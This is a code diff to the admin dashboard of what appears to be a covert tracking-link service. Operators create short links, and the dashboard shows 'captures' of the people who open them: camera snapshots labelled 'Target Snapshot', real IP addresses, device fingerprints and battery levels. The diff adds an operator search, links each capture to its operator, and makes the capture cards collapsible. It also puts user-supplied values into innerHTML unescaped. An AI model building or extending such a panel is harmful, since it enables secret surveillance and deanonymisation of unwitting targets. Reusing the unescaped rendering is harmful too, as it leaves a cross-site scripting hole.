@@ -288,7 +288,10 @@
         </div>
       </div>
 
-      <div class="section-title" style="color: var(--danger); margin-top: 2rem;">👥 Registered Developers</div>
+      <div class="section-title" style="color: var(--danger); margin-top: 2rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
+        <span>👥 Registered Developers</span>
+        <input type="text" id="globalUserSearch" placeholder="Search operator..." style="padding: 0.5rem; border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.5); background: rgba(0,0,0,0.5); color: var(--text); width: 200px; font-family: var(--font-mono); font-size: 0.8rem;" oninput="filterGlobalUsers(this.value)">
+      </div>
       <div id="globalUsersList" class="links-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 1rem;">
         <!-- Users populate here -->
       </div>
@@ -557,9 +560,15 @@ async function loadGlobalData() {
     document.getElementById('gStatLinks').textContent = totalLinks;
     document.getElementById('gStatCaps').textContent  = totalCaps;
 
+    // Mappings to find Operator name for each capture
+    const linkCreatorMap = {};
+    data.links.forEach(l => linkCreatorMap[l.shortCode] = l.creatorId);
+    const userMap = {};
+    data.users.forEach(u => userMap[u.id] = u.username);
+
     // Users List
     const usersHtml = data.users.map(u => `
-      <div class="glass" style="padding: 1rem; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; gap: 1rem;">
+      <div class="glass" data-username="${u.username.toLowerCase()}" style="padding: 1rem; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; gap: 1rem;">
         <div class="user-avatar" style="background: ${u.isAdmin ? 'var(--danger)' : 'var(--accent)'}">${u.username[0].toUpperCase()}</div>
         <div>
           <div style="font-weight: 600">${u.username} ${u.isAdmin ? '<span style="color:var(--danger);font-size:0.75rem;border:1px solid;padding:2px 6px;border-radius:10px;margin-left:5px">ADMIN</span>' : ''} ${u.isBanned ? '<span style="color:red;font-size:0.75rem;margin-left:5px">[BANNED]</span>' : ''}</div>
@@ -575,13 +584,19 @@ async function loadGlobalData() {
     document.getElementById('globalUsersList').innerHTML = usersHtml || '<div class="empty-state">No users</div>';
 
     // Captures Feed
-    const capsHtml = flatCaps.map((c, i) => `
-      <div class="capture-card glass" style="border-left: 4px solid var(--danger);">
-        <div class="capture-header">
-          <span class="capture-num" style="color: var(--danger)">Global ID: ${c.id}</span>
-          <span class="capture-time">${new Date(c.serverTime).toLocaleString()} (Link: ${c.shortCode})</span>
-        </div>
-        <div class="capture-grid">
+    const capsHtml = flatCaps.map((c, i) => {
+      const creatorId = linkCreatorMap[c.shortCode];
+      const operatorName = userMap[creatorId] || 'Unknown Operator';
+      return `
+      <details class="capture-card glass" style="border-left: 4px solid var(--danger); cursor: pointer; outline: none; margin-bottom: 1rem;">
+        <summary class="capture-header" style="list-style: none; display: flex; justify-content: space-between; align-items: center; outline: none; padding: 0.5rem 0;">
+          <div style="display: flex; flex-direction: column; gap: 0.25rem;">
+            <span class="capture-num" style="color: var(--danger); font-size: 1.1rem; font-weight: bold;">Operator: ${operatorName} <span style="font-size: 0.8rem; font-weight: normal; color: var(--text2);">(Link: ${c.shortCode})</span></span>
+            <span class="capture-time" style="font-family: var(--font-mono);">${new Date(c.serverTime).toLocaleString()} | ID: ${c.id}</span>
+          </div>
+          <span style="color: var(--danger); font-size: 1rem; opacity: 0.7;">▼ Expand</span>
+        </summary>
+        <div class="capture-grid" style="margin-top: 1rem; border-top: 1px dashed rgba(255,255,255,0.1); padding-top: 1rem; cursor: default;">
           ${c.cameraPhoto ? `
           <div class="cap-section full-width">
             <div class="cap-label" style="color: var(--danger)">📷 Target Snapshot</div>
@@ -634,13 +649,15 @@ async function loadGlobalData() {
             <div class="cap-val">${c.battery !== null && c.battery !== undefined ? c.battery + '%' : '—'}</div>
           </div>
         </div>
-        <div style="display: flex; gap: 0.5rem; padding: 1rem; border-top: 1px dashed rgba(255,255,255,0.1); margin-top: 1rem;">
+        </div>
+        <div style="display: flex; gap: 0.5rem; padding: 1rem; border-top: 1px dashed rgba(255,255,255,0.1); margin-top: 1rem; cursor: default;">
             <button class="btn-sm" style="border-color: orange; color: orange;" onclick="adminBanEntity('ip', '${c.realIp}')">Ban IP</button>
             <button class="btn-sm" style="border-color: orange; color: orange;" onclick="adminBanEntity('fingerprint', '${c.fingerprint}')">Ban Device</button>
             <button class="btn-sm danger" onclick="adminDeleteCapture('${c.id}')">Delete Capture</button>
         </div>
-      </div>
-    `).join('');
+      </details>
+    `;
+    }).join('');
     document.getElementById('globalCapturesFeed').innerHTML = capsHtml || '<div class="empty-state">No global captures yet</div>';
 
     // Bans Feed
